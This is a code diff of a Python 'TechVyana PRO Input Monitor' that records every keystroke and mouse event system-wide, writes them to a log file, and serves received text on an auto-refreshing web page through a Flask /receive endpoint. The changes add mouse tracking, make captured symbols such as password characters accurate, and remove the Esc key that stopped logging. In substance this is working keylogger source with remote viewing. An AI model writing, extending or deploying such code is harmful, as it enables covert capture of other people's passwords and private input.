@@ -1,5 +1,6 @@
 import tkinter as tk
 from pynput.keyboard import Key, Listener
+from pynput import mouse
 from datetime import datetime
 import threading
 import time
@@ -14,8 +15,15 @@ received_text = ""
 @app.route("/")
 def home():
     return f"""
-    <h1 style='color:lime;background:black;padding:10px'>TechVyana Live</h1>
-    <pre style='color:lime;background:black;padding:10px'>{received_text}</pre>
+    <html>
+    <head>
+        <meta http-equiv="refresh" content="1">
+    </head>
+    <body style="background:black;color:lime;font-family:monospace;">
+        <h1>TechVyana Live</h1>
+        <pre>{received_text}</pre>
+    </body>
+    </html>
     """
 
 @app.route("/receive", methods=["POST"])
@@ -30,13 +38,14 @@ def start_server():
 
 # -------- GET LOCAL IP --------
 def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
-    finally:
         s.close()
-    return ip
+        return ip
+    except:
+        return "127.0.0.1"
 
 # -------- MAIN APP --------
 import requests
@@ -49,7 +58,6 @@ running = False
 LOG_FILE = "log.txt"
 text_buffer = ""
 
-# -------- STATS --------
 start_time = None
 key_count = 0
 
@@ -79,7 +87,7 @@ def update_stats():
         stats_label.config(text=f"Keys: {key_count} | WPM: {int(wpm)}")
     root.after(1000, update_stats)
 
-# -------- KEY HANDLER --------
+# -------- KEYBOARD HANDLER --------
 def on_press(key):
     global caps_on, shift_on, text_buffer, key_count
 
@@ -88,8 +96,30 @@ def on_press(key):
 
     try:
         char = key.char
-        char = char.upper() if (caps_on ^ shift_on) else char.lower()
+
+        # LETTER HANDLING
+        if char.isalpha():
+            if caps_on ^ shift_on:
+                char = char.upper()
+            else:
+                char = char.lower()
+
+        # SPECIAL CHAR HANDLING
+        elif shift_on:
+            special_map = {
+                '1': '!', '2': '@', '3': '#', '4': '$',
+                '5': '%', '6': '^', '7': '&', '8': '*',
+                '9': '(', '0': ')',
+                '-': '_', '=': '+',
+                '[': '{', ']': '}',
+                ';': ':', "'": '"',
+                ',': '<', '.': '>', '/': '?',
+                '\\': '|'
+            }
+            char = special_map.get(char, char)
+
         output = char
+
     except:
         if key == Key.space:
             output = " "
@@ -112,6 +142,7 @@ def on_press(key):
         else:
             return
 
+    # UI update
     text_area.insert(tk.END, output)
     text_area.see(tk.END)
 
@@ -125,8 +156,24 @@ def on_release(key):
     global shift_on
     if key in (Key.shift, Key.shift_r):
         shift_on = False
-    if key == Key.esc:
-        stop_logging()
+
+# -------- MOUSE HANDLER --------
+def on_move(x, y):
+    if running:
+        status_label.config(text=f"Mouse: ({x}, {y})", fg="yellow")
+
+def on_click(x, y, button, pressed):
+    if running:
+        action = "Pressed" if pressed else "Released"
+        msg = f"\n[Mouse {button} {action} at ({x},{y})]\n"
+        text_area.insert(tk.END, msg)
+        text_area.see(tk.END)
+
+def on_scroll(x, y, dx, dy):
+    if running:
+        msg = f"\n[Scroll ({dx},{dy})]\n"
+        text_area.insert(tk.END, msg)
+        text_area.see(tk.END)
 
 # -------- CONTROLS --------
 def start_logging():
@@ -141,18 +188,26 @@ def stop_logging():
     running = False
     status_label.config(text="STOPPED", fg="red")
 
-# -------- LISTENER --------
-def start_listener():
+# -------- THREADS --------
+def start_keyboard():
     with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def start_mouse():
+    with mouse.Listener(
+        on_move=on_move,
+        on_click=on_click,
+        on_scroll=on_scroll
+    ) as listener:
         listener.join()
 
 # -------- UI --------
 root = tk.Tk()
-root.title("TechVyana 2.0 AUTO SERVER")
+root.title("TechVyana PRO Input Monitor")
 root.geometry("800x550")
 root.configure(bg="black")
 
-tk.Label(root, text="TECHVYANA 3.0", fg="lime", bg="black",
+tk.Label(root, text="TECHVYANA PRO", fg="lime", bg="black",
          font=("Consolas", 20, "bold")).pack()
 
 status_label = tk.Label(root, text="STOPPED", fg="red", bg="black")
@@ -171,7 +226,8 @@ tk.Button(frame, text="START", command=start_logging, bg="green").grid(row=0, co
 tk.Button(frame, text="STOP", command=stop_logging, bg="red").grid(row=0, column=1, padx=5)
 
 # -------- START EVERYTHING --------
-threading.Thread(target=start_listener, daemon=True).start()
+threading.Thread(target=start_keyboard, daemon=True).start()
+threading.Thread(target=start_mouse, daemon=True).start()
 threading.Thread(target=start_server, daemon=True).start()
 
 update_stats()
